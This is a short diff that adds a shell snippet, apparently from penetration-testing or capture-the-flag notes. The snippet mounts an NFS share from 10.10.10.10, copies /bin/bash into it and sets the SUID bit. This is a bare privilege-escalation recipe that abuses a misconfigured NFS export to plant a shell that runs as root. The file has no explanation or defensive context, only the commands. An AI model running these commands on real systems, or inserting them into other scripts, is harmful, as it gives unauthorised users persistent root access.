@@ -1,0 +1,12 @@
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash . 	
+
+# set suid permission
+chmod +s bash
